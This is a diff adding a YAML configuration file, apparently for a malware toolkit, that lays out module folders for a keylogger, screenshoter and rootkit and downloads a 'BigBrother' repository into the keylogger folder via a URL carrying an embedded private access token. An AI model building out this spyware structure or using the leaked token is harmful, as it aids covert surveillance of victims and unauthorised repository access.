@@ -1,0 +1,29 @@
+---
+# Python modules to import
+python_modules_needed:
+  - requests
+
+# Module Directories
+module_directories:
+  - modules
+
+# Module Subirectories
+module_directories_subfolders:
+  - anagenesis
+  - aytogenesis
+  - paragenesis
+  - anagenesis/anacrypsis
+  - anagenesis/katascopos
+  - anagenesis/ypnokratos
+  - anagenesis/katascopos/user_based
+  - anagenesis/ypnokratos/deep_abyss
+  - anagenesis/katascopos/user_based/keylogger
+  - anagenesis/katascopos/user_based/screenshoter
+  - anagenesis/ypnokratos/deep_abyss/rootkit
+
+# Download repositories
+download_repositories:
+  - name: windows_api
+    path: anagenesis/katascopos/user_based/keylogger
+    url: https://gitlab.com/PhantomGhosts/BigBrother/repository/archive.tar.gz?ref=master&private_token=ssBUkmzzuQ8x-cqQUd7P
+...
